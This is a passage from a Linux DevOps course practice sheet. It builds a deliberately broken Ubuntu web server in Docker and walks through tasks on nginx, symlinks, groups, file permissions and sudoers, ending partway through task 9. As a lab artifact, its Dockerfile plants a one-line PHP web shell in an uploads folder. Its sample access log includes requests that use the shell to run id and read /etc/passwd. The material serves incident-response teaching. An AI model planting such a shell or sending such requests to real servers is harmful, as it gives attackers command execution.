# Module 02 · Practice Sheet: 30 Linux Tasks on a Broken Server

It's 3 a.m. on Tuesday. allcsvideos' server, web-01, is in a bad way. Rahul's handover note is short:

> The site shows the nginx welcome page. The API is down. The server feels slow. Meera can't upload lesson 4. Priya can't deploy or reload nginx. And I think someone got into the uploads folder. Fix it properly. No 777.

In this practice sheet you get your own copy of that broken web-01: a real Ubuntu 24.04 server, with systemd, nginx, the allcsvideos API stand-in, a small data disk and an SSH server, all running in one Docker container on your machine. Then you fix it, one task at a time, with only the tools from Module 2.

**How to work:**
- You need Docker Desktop, as set up in Module 01. Nothing else is installed on your machine.
- Do the tasks **in order**. Later tasks build on earlier fixes, exactly like a real incident.
- Each task has a **hint** and an **answer**. Try it yourself first. Every answer was run on this exact server, and the output under it is the **real output** (long output is trimmed with `…`).
- Your PIDs, times, dates, memory figures, CPU counts and key fingerprints will differ. The answers say so where it matters. The access log and the broken files are the same for everyone.
- In the answers, `$` is Asha's prompt. On your screen it reads `asha@web-01:~$`.
- The tasks are grouped by lesson, easy to hard: L01 the shell and the filesystem, L02 users, groups and permissions, L03 processes, signals and systemd, L04 text processing, L05 disks, memory and packages, L06 SSH. Tasks marked **Investigate** ask you to find and explain, not only to fix. Tasks 28 to 30 are the final challenge.
- All passwords and keys in the lab are **fake demo values**, made only for this sandbox.

---

## Set up the broken server

**1. Save the Dockerfile.** This repository already has it: [`m02-linux/Dockerfile`](m02-linux/Dockerfile), so you can simply `cd practice/m02-linux` and skip to step 2. (Or make an empty folder, for example `m02-lab`, and save the file below into it as `Dockerfile`.) It builds web-01 and breaks it on purpose, so it **contains every answer**. Copy it without reading it.

<details>
<summary><b>Dockerfile (spoilers: copy it, don't read it)</b></summary>

```dockerfile
# syntax=docker/dockerfile:1
# DevOps course, Module 02 practice sheet: the broken server web-01.
# Ubuntu 24.04 with systemd as PID 1, nginx, the allcsvideos API stand-in, OpenSSH.
# Everything below is broken ON PURPOSE. Reading this file spoils the tasks.
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
      systemd systemd-sysv dbus procps psmisc sudo nginx python3 curl less nano \
      openssh-server openssh-client rsync lsof file cron \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# ---- users and groups ----
RUN <<'EOF'
set -e
useradd -m -s /bin/bash -G sudo,adm asha
useradd -m -s /bin/bash priya
echo 'asha:demo-password-123' | chpasswd     # FAKE demo passwords, lab only
echo 'priya:demo-password-123' | chpasswd
groupadd devs
usermod -aG devs asha                         # priya should be in devs too, but isn't
useradd --system --no-create-home -s /usr/sbin/nologin allcs
echo 'asha ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/asha && chmod 0440 /etc/sudoers.d/asha   # lab convenience
# priya's narrow nginx rule: wrong path, wrong mode
echo 'priya ALL=(root) NOPASSWD: /usr/bin/nginx -t, /usr/bin/nginx -s reload' > /etc/sudoers.d/priya-nginx
chmod 0644 /etc/sudoers.d/priya-nginx
EOF

# ---- the site ----
COPY <<'EOF' /etc/nginx/sites-available/allcsvideos
server {
    listen 80;
    server_name allcsvideos.com www.allcsvideos.com;
    root /var/www/allcsvideos;
    index index.html;
    client_max_body_size 1m;

    location /api/ {
        proxy_pass http://127.0.0.1:8080/;
    }
}
EOF
COPY <<'EOF' /var/www/allcsvideos/index.html
<!doctype html>
<html><head><title>allcsvideos - learn computer science by video</title></head>
<body><h1>allcsvideos</h1><p>DevOps, DSA, System Design, Spring Boot, GenAI.</p></body></html>
EOF
COPY <<'EOF' /srv/allcsvideos/static/robots.txt
User-agent: *
Disallow: /api/
EOF
RUN <<'EOF'
set -e
ln -s /srv/allcsvideos/robots.txt /var/www/allcsvideos/robots.txt      # dangling: the file is in static/
# uploads: the forum "fix" was chmod -R 777, and somebody used it
install -d /var/www/allcsvideos/uploads
head -c 48213 /dev/urandom > /var/www/allcsvideos/uploads/thumb-devops.jpg
head -c 91877 /dev/urandom > /var/www/allcsvideos/uploads/notes-m02.pdf
echo '<?php system($_GET["cmd"]); ?>' > /var/www/allcsvideos/uploads/shell.php
chown nobody:nogroup /var/www/allcsvideos/uploads/shell.php
chmod -R 777 /var/www/allcsvideos/uploads
# the team release folder, created by a root deploy script
install -d -m 755 /srv/releases /srv/releases/v2.14.0
echo 'v2.14.0' > /srv/releases/v2.14.0/VERSION
# a new site build in asha's home, ready to deploy
install -d -o asha -g asha /home/asha/site /home/asha/site/static
echo '<h1>allcsvideos v2.15.0</h1>' > /home/asha/site/index.html
echo 'body{font-family:sans-serif}' > /home/asha/site/static/style.css
echo 'console.log("allcsvideos")' > /home/asha/site/static/app.js
chown -R asha:asha /home/asha/site
EOF

# ---- the API stand-in and its settings ----
COPY <<'EOF' /srv/allcsvideos/app.env
# allcsvideos API settings
APP_ENV=production
DB_HOST=db-01
DB_PASSWORD=demo-password-123
UPLOAD_DIR=/data/uploads
EOF
COPY <<'EOF' /opt/allcsvideos/api.py
#!/usr/bin/env python3
# allcsvideos API stand-in for the Linux lessons (port 8080). Settings come from /srv/allcsvideos/app.env.
#   GET  /health, GET /courses
#   POST /upload?name=X   stores the request body in UPLOAD_DIR/X
import json, os
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

S = {}
for line in open('/srv/allcsvideos/app.env'):
    line = line.strip()
    if line and not line.startswith('#') and '=' in line:
        k, v = line.split('=', 1); S[k] = v

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *a): print('api:', fmt % a, flush=True)
    def reply(self, code, obj):
        b = (json.dumps(obj) + '\n').encode(); self.send_response(code)
        self.send_header('Content-Type', 'application/json'); self.send_header('Content-Length', str(len(b)))
        self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        if self.path == '/health': return self.reply(200, {'status': 'ok'})
        if self.path == '/courses': return self.reply(200, {'courses': ['devops', 'dsa', 'system-design']})
        self.reply(404, {'error': 'not found'})
    def do_POST(self):
        u = urlparse(self.path)
        if u.path != '/upload': return self.reply(404, {'error': 'not found'})
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        name = os.path.basename(parse_qs(u.query).get('name', ['upload.bin'])[0])
        path = os.path.join(S['UPLOAD_DIR'], name)
        try:
            with open(path, 'wb') as f: f.write(body)
        except OSError as e:
            try: os.remove(path)
            except OSError: pass
            return self.reply(507, {'error': f'upload failed: {e.strerror}'})
        self.reply(201, {'saved': name, 'bytes': len(body)})

print('allcsvideos-api: listening on port 8080', flush=True)
ThreadingHTTPServer(('', 8080), H).serve_forever()
EOF
COPY <<'EOF' /opt/allcsvideos/encoder.py
#!/usr/bin/env python3
# allcsvideos video encoder stand-in: writes a status line to /data/logs/encoder.log every 5 seconds.
# SIGHUP reopens the log file, like most daemons.
import signal, time
LOG = '/data/logs/encoder.log'
f = None
def reopen(*_):
    global f
    if f:
        try: f.close()
        except OSError: pass   # unwritten lines on a full disk are dropped
    f = open(LOG, 'a')
while True:
    try:
        reopen(); break
    except OSError:
        time.sleep(1)          # the data disk is not ready yet
signal.signal(signal.SIGHUP, reopen)
while True:
    try:
        f.write(time.strftime('%Y-%m-%dT%H:%M:%S') + ' encoder: queue empty, waiting\n'); f.flush()
    except OSError:
        pass
    time.sleep(5)
EOF
COPY <<'EOF' /home/priya/reindex.py
# search reindex, "quick test" - Priya
while True:
    pass
EOF
RUN <<'EOF'
set -e
chmod 755 /opt/allcsvideos/*.py
chmod 644 /srv/allcsvideos/app.env
chown priya:priya /home/priya/reindex.py
EOF

# ---- services ----
COPY <<'EOF' /etc/systemd/system/allcsvideos-api.service
[Unit]
Description=allcsvideos API
After=network.target

[Service]
User=allcs
ExecStart=/usr/bin/pyhton3 /opt/allcsvideos/api.py
Restart=on-failure
RestartSec=1

[Install]
WantedBy=multi-user.target
EOF
COPY <<'EOF' /etc/systemd/system/allcsvideos-encoder.service
[Unit]
Description=allcsvideos video encoder

[Service]
User=allcs
ExecStart=/usr/bin/python3 /opt/allcsvideos/encoder.py
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
COPY <<'EOF' /etc/systemd/system/allcsvideos-reindex.service
[Unit]
Description=allcsvideos search reindex (temporary, Priya)

[Service]
User=priya
ExecStart=/usr/bin/python3 /home/priya/reindex.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF
# lab-stage: part of the lab, not a puzzle. At every boot it rebuilds the data disk (/data) and fills it.
COPY --chmod=755 <<'EOF' /usr/local/sbin/lab-stage
#!/bin/bash
# first boot only: two "backup" copies of the settings (made at first boot, so they behave like files on a normal disk)
if [ ! -e /var/lib/lab/backups-made ]; then
  ln /srv/allcsvideos/app.env /home/priya/app.env.old
  cp /srv/allcsvideos/app.env /var/backups/app.env.save
  chown priya:priya /var/backups/app.env.save && chmod 644 /var/backups/app.env.save
  mkdir -p /var/lib/lab && touch /var/lib/lab/backups-made
fi
install -d -o allcs -g allcs -m 755 /data/uploads
install -d -o allcs -g adm -m 2750 /data/logs
for i in 1 2 3; do head -c 3145728 /dev/urandom > /data/uploads/lesson-0$i.mp4; done
chown allcs:allcs /data/uploads/*.mp4
python3 - <<'PY'
import random
r = random.Random(7)
with open('/data/logs/api.log.1', 'w') as f:
    n = 0
    while f.tell() < 20 * 1024 * 1024:
        n += 1
        f.write(f'2026-10-18T{n // 3600 % 24:02d}:{n // 60 % 60:02d}:{n % 60:02d} DEBUG cache lookup '
                f'key=course:{r.randint(1, 240)}:lesson:{r.randint(1, 60)} hit={r.choice(["true", "false"])} took={r.randint(1, 9)}ms\n')
PY
chown allcs:adm /data/logs/api.log.1 && chmod 640 /data/logs/api.log.1
touch -d '2026-10-18 23:59:59' /data/logs/api.log.1
# wait until the encoder has its log open, then fill the disk through that log and delete its name
for i in $(seq 60); do
  pid=$(systemctl show -p MainPID --value allcsvideos-encoder)
  [ "$pid" != 0 ] && ls -l /proc/$pid/fd 2>/dev/null | grep -q encoder.log && break
  sleep 1
done
yes '2026-10-20T02:40:00 encoder: DEBUG frame buffer dump 0000000000000000000000000000' >> /data/logs/encoder.log 2>/dev/null
rm -f /data/logs/encoder.log
exit 0
EOF
COPY <<'EOF' /etc/systemd/system/lab-stage.service
[Unit]
Description=Practice lab: stage the data disk (part of the lab, not a task)
After=allcsvideos-encoder.service

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/local/sbin/lab-stage

[Install]
WantedBy=multi-user.target
EOF

# ---- the sample access log from last night (generated, not real traffic) ----
COPY <<'EOF' /root/gen_access_log.py
import random
from datetime import datetime, timedelta
r = random.Random(2026)
T0, END = datetime(2026, 10, 19, 22, 0, 0), datetime(2026, 10, 20, 4, 0, 0)
FULL, DOWN = datetime(2026, 10, 20, 2, 47, 0), datetime(2026, 10, 20, 2, 58, 30)
IPS = [f'203.0.113.{i}' for i in range(30, 70)] + [f'198.51.100.{i}' for i in range(10, 40)]
W = [1 / (i + 2) ** 0.8 for i in range(len(IPS))]
UA = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Safari/605.1.15',
      'Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/129.0 Mobile', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Firefox/131.0']
UA_OF = {ip: r.choice(UA) for ip in IPS}
PAGES = [('GET', '/', 200, 18432, 10), ('GET', '/courses/devops', 200, 24117, 8), ('GET', '/courses/dsa', 200, 23980, 6),
         ('GET', '/static/app.js', 200, 187342, 8), ('GET', '/robots.txt', 404, 162, 2), ('GET', '/api/courses', 200, 61, 8),
         ('POST', '/api/checkout', 200, 44, 2), ('GET', '/videos/devops/lesson-03.m3u8', 200, 1210, 6)]
lines = []
def add(t, ip, m, p, st, b, ua=None):
    lines.append((t, f'{ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{m} {p} HTTP/1.1" {st} {b} "-" "{ua or UA_OF.get(ip, UA[0])}"'))
t = T0
while t < END:
    t += timedelta(seconds=r.randint(1, 7))
    ip = r.choices(IPS, W)[0]; m, p, st, b, _ = r.choices(PAGES, [x[4] for x in PAGES])[0]
    if p.startswith('/api/') and t >= DOWN: st, b = 502, 166
    add(t, ip, m, p, st, b)
# Meera uploads lessons: fine until the data disk fills at 02:47, then 507, then 502 once the API is down
MEERA = '203.0.113.25'
for hh, mm, ss, n, st in [(22, 41, 9, 2, 201), (23, 58, 40, 3, 201), (2, 47, 12, 4, 507), (2, 49, 55, 4, 507), (2, 53, 31, 4, 507),
                          (2, 56, 2, 4, 507), (3, 5, 44, 4, 502), (3, 12, 19, 4, 502)]:
    day = 19 if hh >= 22 else 20
    add(datetime(2026, 10, day, hh, mm, ss), MEERA, 'POST', f'/api/upload?name=lesson-0{n}.mp4', st, 166 if st == 502 else 52)
# password guessing against the login form
t = datetime(2026, 10, 19, 23, 30, 0)
while t < datetime(2026, 10, 20, 0, 15, 0):
    t += timedelta(seconds=r.randint(2, 4)); add(t, '192.0.2.66', 'POST', '/login', 401, 39, 'python-requests/2.32.3')
# a scanner, and the planted shell
SC = '192.0.2.14'
t = datetime(2026, 10, 20, 1, 12, 5)
for p, st in [('/wp-login.php', 404), ('/.env', 404), ('/xmlrpc.php', 404), ('/admin/', 404), ('/uploads/shell.php?cmd=id', 200),
              ('/uploads/shell.php?cmd=uname+-a', 200), ('/uploads/shell.php?cmd=cat+/etc/passwd', 200)]:
    t += timedelta(seconds=r.randint(20, 90)); add(t, SC, 'GET', p, st, 31 if st == 200 else 162, 'Mozilla/5.0 zgrab/0.x')
lines.sort()
with open('/var/log/nginx/access.log.1', 'w') as f:
    f.write(''.join(l + '\n' for _, l in lines))
EOF
RUN python3 /root/gen_access_log.py && rm /root/gen_access_log.py \
    && chown www-data:adm /var/log/nginx/access.log.1 && chmod 640 /var/log/nginx/access.log.1

# ---- SSH: a hardening file with a typo, and asha's key with a broken folder ----
COPY <<'EOF' /etc/ssh/sshd_config.d/10-hardening.conf
PermitRootLogin no
PasswordAuthentication no
KbdInteractiveAuthenticaton no
AllowUsers asha priya
EOF
RUN <<'EOF'
set -e
install -d -o asha -g asha -m 700 /home/asha/.ssh
su asha -c 'ssh-keygen -q -t ed25519 -N "" -C asha@web-01 -f /home/asha/.ssh/id_ed25519'
cp /home/asha/.ssh/id_ed25519.pub /home/asha/.ssh/authorized_keys
echo "localhost $(cut -d' ' -f1,2 /etc/ssh/ssh_host_ed25519_key.pub)" > /home/asha/.ssh/known_hosts
chown -R asha:asha /home/asha/.ssh
chmod 600 /home/asha/.ssh/authorized_keys
chmod 777 /home/asha/.ssh                     # a forum "fix"
systemctl enable allcsvideos-api allcsvideos-encoder allcsvideos-reindex lab-stage
EOF

STOPSIGNAL SIGRTMIN+3
CMD ["/sbin/init"]
```

</details>

**2. Build the image** (about a minute the first time; it needs the internet for `apt`):

```bash
cd m02-lab        # in this repository: cd practice/m02-linux
docker build --label course=devops -t m02lab-web01 .
```

**3. Start web-01** with one `docker run`:

```bash
docker run -d --name m02lab-web01 --label course=devops --hostname web-01 \
  --privileged --cgroupns=private --tmpfs /run --tmpfs /run/lock \
  --tmpfs /data:size=64m,nr_inodes=4096,mode=755 m02lab-web01
```

What the flags do: `--hostname web-01` names the server. `--privileged`, `--cgroupns=private` and the two `/run` tmpfs mounts let systemd run as PID 1, like on a real server. `--tmpfs /data:size=64m,nr_inodes=4096` is web-01's small **data disk**: 64 megabytes and 4096 inodes, kept in memory, so filling it is safe.

**4. Wait about 30 seconds** while it boots and the staging finishes, then log in as Asha:

```bash
docker exec -it -u asha -w /home/asha m02lab-web01 bash -l
```

A few lab notes:
- In this lab, Asha's `sudo` doesn't ask for a password, so you can focus on the tasks. On a real server it asks for her own password. Priya's password, if anything asks for it, is the fake `demo-password-123`.
- `systemctl` and `journalctl` open long output in a pager: `q` quits. Add `--no-pager`, or run `export SYSTEMD_PAGER=` once, to print straight to the screen.
- One unit, `lab-stage.service`, belongs to the lab, not to the puzzle: at every boot it rebuilds and fills the data disk. Leave it alone.
- **Start over** at any time: `docker rm -f m02lab-web01`, then the `docker run` again. Restarting the container (`docker restart`) keeps your fixes on the system disk, but rebuilds the data disk.
- When you're done, clean up with the commands at the end of this sheet.

---

## M02 · L01 The Shell and the Filesystem

### 1 · Get your bearings
Before you touch anything, answer four questions with one command each: which user are you, what is this machine called, which folder are you in, and which Ubuntu release is it? Then list **everything** in your home folder, hidden files included.

<details>
<summary>Hint</summary>

`whoami`, `hostname`, `pwd`. The release is in a config file in `/etc` called `os-release`: `grep` its `PRETTY_NAME` line. `ls` hides names that start with a dot until you add `-a`.

</details>

<details>
<summary>Answer</summary>

```text
$ whoami
asha
$ hostname
web-01
$ pwd
/home/asha
$ grep PRETTY_NAME /etc/os-release
PRETTY_NAME="Ubuntu 24.04.5 LTS"
$ ls -a
.  ..  .bash_logout  .bashrc  .profile  .ssh  site
```

`.ssh` holds Asha's SSH keys (task 26), and `site` is a new build of the storefront, waiting to be deployed (task 27).

</details>

### 2 · Which site is switched on? (Investigate)
Rahul says the site shows the nginx welcome page. Confirm it from the server itself with `curl`, then find out **why**: which site files exist, which ones are switched on, and which line of `nginx.conf` decides that? Don't fix anything yet.

<details>
<summary>Hint</summary>

`curl -s localhost` fetches the home page; `grep title` keeps the page title. Site files live in `/etc/nginx/sites-available`, and the switched-on ones are links in `/etc/nginx/sites-enabled`. `grep -n include` on `/etc/nginx/nginx.conf` shows what nginx loads.

</details>

<details>
<summary>Answer</summary>

```text
$ curl -s localhost | grep title
<title>Welcome to nginx!</title>
$ ls -l /etc/nginx/sites-enabled/
total 0
lrwxrwxrwx 1 root root 34 Oct 20 10:46 default -> /etc/nginx/sites-available/default
$ ls /etc/nginx/sites-available/
allcsvideos
default
$ grep -n include /etc/nginx/nginx.conf
5:include /etc/nginx/modules-enabled/*.conf;
26:	include /etc/nginx/mime.types;
59:	include /etc/nginx/conf.d/*.conf;
60:	include /etc/nginx/sites-enabled/*;
```

Line 60 is the answer: nginx loads every file in `sites-enabled`. That folder holds one symlink, `default`, so nginx serves the default welcome page. The `allcsvideos` site file exists in `sites-available`, but nothing links to it, so nginx never reads it.

</details>

### 3 · Switch on the allcsvideos site
Switch the allcsvideos site on and the default site off, the nginx way: with links, not by copying or deleting site files. Test the config before you apply it, apply it without stopping nginx, and check the page title again. What does `/api/health` return through nginx right now?

<details>
<summary>Hint</summary>

`ln -s` makes a symlink in `sites-enabled` that points to the real file in `sites-available`. Removing the `default` link removes only the link. Changing `/etc` needs `sudo`. `nginx -t` tests, and `systemctl reload nginx` applies. `curl -i` prints the status line.

</details>

<details>
<summary>Answer</summary>

```text
$ sudo ln -s /etc/nginx/sites-available/allcsvideos /etc/nginx/sites-enabled/allcsvideos
$ sudo rm /etc/nginx/sites-enabled/default
$ ls -l /etc/nginx/sites-enabled/
total 0
lrwxrwxrwx 1 root root 38 Oct 20 10:58 allcsvideos -> /etc/nginx/sites-available/allcsvideos
$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
$ sudo systemctl reload nginx
$ curl -s localhost | grep title
<html><head><title>allcsvideos - learn computer science by video</title></head>
$ curl -s -i localhost/api/health | head -1
HTTP/1.1 502 Bad Gateway
```

The storefront is back. `502 Bad Gateway` means nginx is fine, but the API behind it, on port 8080, isn't answering. That's tasks 12 and 13. (`sudo nginx -s reload` works too; `systemctl reload nginx` asks systemd to send the same reload.)

</details>

### 4 · A file that isn't there
Search engines get a 404 for `/robots.txt`, but someone swears the file was deployed. Find every **broken symlink** under `/var/www`, see where it points, find where the real file is, and fix the link. Prove it with `curl`.

<details>
<summary>Hint</summary>

`find /var/www -xtype l` lists symlinks whose target doesn't exist (`-xtype l` means: still a link after following it, so the target is missing). `ls -l` and `file` show the target. `find /srv -name robots.txt` finds the real file. `ln -sfn` replaces an existing link in one step.

</details>

<details>
<summary>Answer</summary>

```text
$ curl -s -i localhost/robots.txt | head -1
HTTP/1.1 404 Not Found
$ find /var/www -xtype l
/var/www/allcsvideos/robots.txt
$ ls -l /var/www/allcsvideos/robots.txt
lrwxrwxrwx 1 root root 27 Oct 20 10:46 /var/www/allcsvideos/robots.txt -> /srv/allcsvideos/robots.txt
$ file /var/www/allcsvideos/robots.txt
/var/www/allcsvideos/robots.txt: broken symbolic link to /srv/allcsvideos/robots.txt
$ find /srv -name robots.txt
/srv/allcsvideos/static/robots.txt
$ sudo ln -sfn /srv/allcsvideos/static/robots.txt /var/www/allcsvideos/robots.txt
$ ls -l /var/www/allcsvideos/robots.txt
lrwxrwxrwx 1 root root 34 Oct 20 10:58 /var/www/allcsvideos/robots.txt -> /srv/allcsvideos/static/robots.txt
$ curl -s localhost/robots.txt
User-agent: *
Disallow: /api/
$ find /var/www -xtype l
```

A symlink stores only a path. The file lives in `static/`, but the link pointed one folder too high, so it broke. The last `find` prints nothing: no broken links left. `-f` replaces the old link, and `-n` stops `ln` from following an existing link to a folder.

</details>

---

## M02 · L02 Users, Groups and Permissions

### 5 · Who's who? (Investigate)
Priya says she can't write to the team's release folder. Start with identities: show Asha's and Priya's user IDs and groups, and the members of the `devs` group. What's missing? Fix it, the safe way.

<details>
<summary>Hint</summary>

`id <user>` and `getent group devs`. `usermod -aG` **adds** a supplementary group. Never forget the `-a`: without it, `-G` replaces all of Priya's groups.

</details>

<details>
<summary>Answer</summary>

```text
$ id asha
uid=1001(asha) gid=1001(asha) groups=1001(asha),4(adm),27(sudo),1003(devs)
$ id priya
uid=1002(priya) gid=1002(priya) groups=1002(priya)
$ getent group devs
devs:x:1003:asha
$ sudo usermod -aG devs priya
$ id priya
uid=1002(priya) gid=1002(priya) groups=1002(priya),1003(devs)
$ getent group devs
devs:x:1003:asha,priya
```

Priya was never added to `devs`. Asha is in `adm` (she can read logs), `sudo` (admin) and `devs`. Priya would need to log in again for her running shells to pick up the new group; new processes started for her, like `sudo -u priya` in the next task, get it straight away.

</details>

### 6 · The team release folder
`/srv/releases` is where the team drops each release. Show its owner, group and mode, and prove Priya can't create a file in it. Then turn it into a proper team folder: group `devs`, writable by the group, and every new file in it should belong to `devs` automatically. Prove it as Priya, and clean up your test file.

<details>
<summary>Hint</summary>

`ls -ld` shows the folder itself. `sudo -u priya touch …` runs one command as Priya. `chgrp devs`, then a mode of `2775`: the leading 2 is **setgid**, which makes new files inherit the folder's group.

</details>

<details>
<summary>Answer</summary>

```text
$ ls -ld /srv/releases
drwxr-xr-x 3 root root 4096 Oct 20 10:46 /srv/releases
$ sudo -u priya touch /srv/releases/priya-test
touch: cannot touch '/srv/releases/priya-test': Permission denied
$ sudo chgrp devs /srv/releases
$ sudo chmod 2775 /srv/releases
$ ls -ld /srv/releases
drwxrwsr-x 1 root devs 4096 Oct 20 10:46 /srv/releases
$ sudo -u priya touch /srv/releases/priya-test
$ ls -l /srv/releases
total 4
-rw-rw-r-- 1 priya devs    0 Oct 20 10:58 priya-test
drwxr-xr-x 2 root  root 4096 Oct 20 10:46 v2.14.0
$ sudo rm /srv/releases/priya-test
```

A root deploy script had created the folder as `root:root 755`, so only root could write. Now the group set is `rws`: the `s` is setgid. Priya's new file belongs to `devs`, not to her private group `priya`, so the whole team can work on it.

</details>

### 7 · The 777 uploads folder (Investigate)
Someone "fixed" an upload error on the site's uploads folder, `/var/www/allcsvideos/uploads`, with `chmod -R 777`. Find **everything** under `/var/www` that any user can write to, look inside the uploads folder, and explain what went wrong. Then fix it properly: the folder belongs to `www-data` (the user nginx and the uploader run as), folders `750`, files `640`. Prove that `www-data` can still write, that nobody else can, and that nginx still serves the thumbnail.

<details>
<summary>Hint</summary>

`find /var/www -perm -o+w` finds things that "other" can write. Check who owns each file in `ls -la`. Use `chown -R`, then **two** `find … -exec chmod` commands, one for `-type d` and one for `-type f` (`chmod -R 750` would make every file executable). Test with `sudo -u www-data` and `sudo -u nobody`.

</details>

<details>
<summary>Answer</summary>

```text
$ find /var/www -perm -o+w
/var/www/allcsvideos/robots.txt
/var/www/allcsvideos/uploads
/var/www/allcsvideos/uploads/thumb-devops.jpg
/var/www/allcsvideos/uploads/notes-m02.pdf
/var/www/allcsvideos/uploads/shell.php
$ ls -la /var/www/allcsvideos/uploads
total 152
drwxrwxrwx 2 root   root     4096 Oct 20 10:46 .
drwxr-xr-x 1 root   root     4096 Oct 20 10:58 ..
-rwxrwxrwx 1 root   root    91877 Oct 20 10:46 notes-m02.pdf
-rwxrwxrwx 1 nobody nogroup    31 Oct 20 10:46 shell.php
-rwxrwxrwx 1 root   root    48213 Oct 20 10:46 thumb-devops.jpg
$ cat /var/www/allcsvideos/uploads/shell.php
<?php system($_GET["cmd"]); ?>
$ sudo rm /var/www/allcsvideos/uploads/shell.php
$ sudo chown -R www-data:www-data /var/www/allcsvideos/uploads
$ sudo find /var/www/allcsvideos/uploads -type d -exec chmod 750 {} \;
$ sudo find /var/www/allcsvideos/uploads -type f -exec chmod 640 {} \;
$ sudo ls -la /var/www/allcsvideos/uploads
total 156
drwxr-x--- 1 www-data www-data  4096 Oct 20 10:58 .
drwxr-xr-x 1 root     root      4096 Oct 20 10:58 ..
-rw-r----- 1 www-data www-data 91877 Oct 20 10:46 notes-m02.pdf
-rw-r----- 1 www-data www-data 48213 Oct 20 10:46 thumb-devops.jpg
$ sudo -u www-data touch /var/www/allcsvideos/uploads/thumb-dsa.jpg
$ sudo -u nobody touch /var/www/allcsvideos/uploads/evil.php
touch: cannot touch '/var/www/allcsvideos/uploads/evil.php': Permission denied
$ curl -s -i localhost/uploads/thumb-devops.jpg | head -1
HTTP/1.1 200 OK
$ sudo find /var/www -perm -o+w ! -type l
```

What went wrong: the folder was owned by root, so the uploader (`www-data`) couldn't write. 777 didn't fix the owner. It gave write access to **every** account, and `nobody`, which stands for any user or any hacked service, used it to plant `shell.php`, a one-line web shell. Task 18 shows it was even used.

Two details in the output: `robots.txt` shows up in the first `find` because a symlink's own mode is always `rwxrwxrwx` and is never used, so the last `find` skips links with `! -type l` and prints nothing. And `sudo ls` is needed now, because Asha is "other" for the uploads folder. That's least privilege working.

</details>

### 8 · A password anyone can read
The API's settings file, `/srv/allcsvideos/app.env`, holds the database password (a fake one). Show its mode and prove that Priya can read it. Only the API, which runs as the system user `allcs`, needs it. Fix it so root owns it, `allcs` can read it, and everyone else gets nothing. Prove both sides. (Look at the link count in `ls -l` too. You'll need it in task 29.)

<details>
<summary>Hint</summary>

`chown root:allcs`, then `chmod 640`: read and write for the owner, read for the group, nothing for other. Test with `sudo -u priya cat` and `sudo -u allcs`.

</details>

<details>
<summary>Answer</summary>

```text
$ ls -l /srv/allcsvideos/app.env
-rw-r--r-- 2 root root 115 Oct 20 10:46 /srv/allcsvideos/app.env
$ sudo -u priya cat /srv/allcsvideos/app.env
# allcsvideos API settings
APP_ENV=production
DB_HOST=db-01
DB_PASSWORD=demo-password-123
UPLOAD_DIR=/data/uploads
$ sudo chown root:allcs /srv/allcsvideos/app.env
$ sudo chmod 640 /srv/allcsvideos/app.env
$ ls -l /srv/allcsvideos/app.env
-rw-r----- 2 root allcs 115 Oct 20 10:46 /srv/allcsvideos/app.env
$ sudo -u priya cat /srv/allcsvideos/app.env
cat: /srv/allcsvideos/app.env: Permission denied
$ sudo -u allcs grep -c = /srv/allcsvideos/app.env
4
```

`644` meant every account on the server could read the password. Now `allcs` reads it through the group set (4 settings lines), and Priya is "other": denied. Don't use `600` with owner root here: the API runs as `allcs`, not root, and couldn't start. The `2` after the mode is the link count: this file has **two names**.

</details>

### 9 · Priya's sudo rule
Priya should be able to run exactly two commands as root, without a password: `nginx -t` and `nginx -s reload`. A rule for that exists in `/etc/sudoers.d/priya-nginx`, but it doesn't work. Check every sudoers file, list Priya's rules, and test them as Priya. Find the **two** problems and fix them without ever breaking sudo. Prove that Priya can test nginx, and still can't read `/etc/shadow`.

<details>
<summary>Hint</summary>

`sudo visudo -c` checks every sudoers file. `sudo -l -U priya` lists her rules. `sudo -u priya sudo -n nginx -t` tests as her (`-n` means: fail instead of asking for a password). Where does `nginx` really live? `which nginx`. Edit sudoers only with `visudo -f`, which checks the syntax before saving.

</details>

<details>
<summary>Answer</summary>

```text
$ sudo visudo -c
/etc/sudoers.d/priya-nginx: bad permissions, should be mode 0440
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/asha: parsed OK
$ sudo -l -U priya
Matching Defaults entries for priya on web-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User priya may run the following commands on web-01:
    (root) NOPASSWD: /usr/bin/nginx -t, /usr/bin/nginx -s reload
$ sudo -u priya sudo -n nginx -t
sudo: a password is required
$ which nginx
/usr/sbin/nginx
```

Problem 1: the file is mode `0644`, and sudoers files should be `0440`. Problem 2: the rule allows `/usr/bin/nginx`, but nginx is `/usr/sbin/nginx`. sudo matches the full path, so Priya's real `nginx -t` matches no rule, and sudo falls back to asking for her password.

Fix the path with `sudo visudo -f /etc/sudoers.d/priya-nginx`: change `/usr/bin/nginx` to `/usr/sbin/nginx` twice, and save. The same edit without opening an editor, still checked by visudo, hands `sed` to visudo as the editor:

```text
$ sudo EDITOR='sed -i s#/usr/bin/nginx#/usr/sbin/nginx#g' visudo -f /etc/sudoers.d/priya-nginx
$ sudo chmod 0440 /etc/sudoers.d/priya-nginx
$ sudo cat /etc/sudoers.d/priya-nginx
priya ALL=(root) NOPASSWD: /usr/sbin/nginx -t, /usr/sbin/nginx -s reload
$ sudo visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/asha: parsed OK
